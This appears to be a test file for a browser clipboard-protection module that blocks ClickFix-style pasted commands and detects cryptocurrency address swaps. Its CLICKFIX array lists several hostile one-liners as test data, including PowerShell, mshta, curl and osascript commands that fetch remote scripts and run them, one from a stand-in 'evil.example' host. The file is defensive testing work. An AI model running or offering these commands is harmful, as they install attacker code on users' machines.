import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { clipboardGuard, analyzeClipboardText, addressType } from '../../modules/clipboardGuard'
import { events } from '../../core/events'

const CLICKFIX = [
  'powershell -w hidden -c "iwr https://185.12.33.4/x.ps1 | iex" # I am not a robot - reCAPTCHA Verification ID: 4821',
  'mshta https://evil.example/verify.hta',
  'cmd /c curl -s https://x.io/a.bat -o %TEMP%\\a.bat && %TEMP%\\a.bat',
  'curl -fsSL https://x.io/install.sh | bash',
  'echo Y3VybCBldmls | base64 -d | sh',
  'osascript -e \'do shell script "curl -s https://x.io/p | sh"\'',
  'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA'
]
const BENIGN = ['Hello, world', 'npm install react', 'https://example.com/docs', 'git clone https://github.com/a/b', 'SELECT * FROM users']

describe('clipboard analysis', () => {
  it('flags ClickFix payloads', () => {
    for (const t of CLICKFIX) expect(analyzeClipboardText(t).malicious, t).toBe(true)
  })
  it('leaves normal text alone', () => {
    for (const t of BENIGN) expect(analyzeClipboardText(t).malicious, t).toBe(false)
  })
  it('recognizes wallet addresses', () => {
    expect(addressType('0x52908400098527886E0F7030069857D2E4169EE7')).toBe('ethereum')
    expect(addressType('bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq')).toBe('bitcoin')
    expect(addressType('hello')).toBeNull()
  })
})

describe('clipboardGuard', () => {
  let written: string[] = []
  beforeEach(() => {
    events.reset()
    written = []
    Object.defineProperty(navigator, 'clipboard', {
      configurable: true,
      value: { writeText: vi.fn(async (t: string) => { written.push(t) }) }
    })
  })
  afterEach(() => clipboardGuard.disable())

  it('blocks malicious writeText and lets normal text through', async () => {
    const seen = vi.fn()
    events.on('clipboard_payload_blocked', seen)
    clipboardGuard.enable()
    await expect(navigator.clipboard.writeText(CLICKFIX[0])).rejects.toThrow(/Blocked/)
    await navigator.clipboard.writeText('coupon: SAVE10')
    expect(written).toEqual(['coupon: SAVE10'])
    expect(seen.mock.calls[0][0].details.reasons).toContain('PowerShell')
  })

  it('report mode only reports', async () => {
    clipboardGuard.enable({ mode: 'report' })
    await navigator.clipboard.writeText(CLICKFIX[3])
    expect(written).toHaveLength(1)
  })

  it('blocks execCommand("copy") of a hidden payload', () => {
    const exec = vi.fn(() => true)
    ;(document as any).execCommand = exec
    clipboardGuard.enable()
    const ta = document.createElement('textarea')
    ta.value = CLICKFIX[1]
    document.body.appendChild(ta)
    ta.focus()
    ta.select()
    expect(document.execCommand('copy')).toBe(false)
    expect(exec).not.toHaveBeenCalled()
    ta.remove()
  })

  it('detects crypto address swap right after a user copy', async () => {
    const seen = vi.fn()
    events.on('clipboard_address_swap', seen)
    clipboardGuard.enable()
    document.body.innerHTML = '<p id="addr">0x52908400098527886E0F7030069857D2E4169EE7</p>'
    const range = document.createRange()
    range.selectNodeContents(document.getElementById('addr')!)
    document.getSelection()!.removeAllRanges()
    document.getSelection()!.addRange(range)
    document.dispatchEvent(new Event('copy'))
    await expect(navigator.clipboard.writeText('0x000000000000000000000000000000000000dEaD')).rejects.toThrow()
    expect(seen).toHaveBeenCalledTimes(1)
  })

  it('restores clipboard methods on disable', () => {
    const orig = navigator.clipboard.writeText
    clipboardGuard.enable()
    expect(navigator.clipboard.writeText).not.toBe(orig)
    clipboardGuard.disable()
    expect(navigator.clipboard.writeText).toBe(orig)
  })
})
